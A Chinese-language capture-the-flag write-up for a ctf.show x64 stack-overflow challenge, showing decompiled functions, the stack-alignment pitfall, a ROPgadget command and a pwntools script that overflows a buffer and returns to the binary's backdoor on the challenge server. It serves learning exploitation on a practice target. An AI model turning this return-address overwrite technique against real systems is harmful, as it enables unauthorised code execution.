```cpp
int __fastcall main(int argc, const char **argv, const char **envp)

  welcome(argc, argv, envp);
```

```cpp
int welcome()
{
  char s[12]; // [rsp+4h] [rbp-Ch] BYREF
```

```cpp
int getFlag()
```

## 过程

> [!fail] 错误直觉
> 觉得直接覆写 `ret_address` 到 `getFlag` 就行了。

在 x32 这是成立的，但是 x64 里面有[[x64栈对齐||栈对齐]]，直接ret会导致打破栈对齐的平衡。而 `system` 函数里面的某些指令是要求栈对齐的。


> [!check] 正解
> 在跳到目标函数之前，先跳到 `ret` Gadegt，再跳到目标函数，两次不平衡就中和了。

```bash
# 寻找 ret 指令地址
ROPgadget --binary ./pwn --only "ret"
```

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'

# p = process(['./pwn'])
p = remote('pwn.challenge.ctf.show', 28276)

# 0x00000000004005B7 是 welcome(这里偷懒了，没找gadget)
# 0x0000000000400577 是后门
payload = flat([b"A"*20,0x00000000004005B7 ,0x0000000000400577])

p.sendline(payload)

payload = b"qwq"

p.sendline(payload)

p.interactive()
```
